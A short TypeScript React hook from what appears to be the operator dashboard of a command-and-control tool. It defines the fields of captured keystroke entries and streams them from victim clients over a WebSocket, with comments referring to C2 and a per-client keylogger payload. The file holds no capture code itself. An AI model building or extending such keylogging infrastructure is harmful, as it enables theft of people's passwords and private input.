import { usePayloadEntries } from "@/hooks/use-payload-entries";

export interface KeyloggerEntry {
  id?: number;
  elementDescriptor: string;
  elementType: string;
  eventType: "input" | "key" | "change";
  data: string;
  value: string;
  timestamp: number;
}

interface UseKeyloggerResult {
  entries: KeyloggerEntry[];
  status: "connecting" | "open" | "closed";
  /** False when the client has disconnected from C2 (reset to true on next data message). */
  clientConnected: boolean;
  /** False when the keylogger payload is not enabled on this client (set by client-info). */
  payloadEnabled: boolean;
  /** Send a clear command to the server and optimistically reset local state. */
  clearEntries: () => void;
}

/**
 * React hook that manages keylogger entries from a WebSocket viewer connection.
 * Delegates to the generic usePayloadEntries hook.
 */
export function useKeylogger(clientId: string): UseKeyloggerResult {
  return usePayloadEntries<KeyloggerEntry>({
    clientId,
    payloadName: "keylogger",
    incrementalType: "entries",
    dataField: "entries",
  });
}
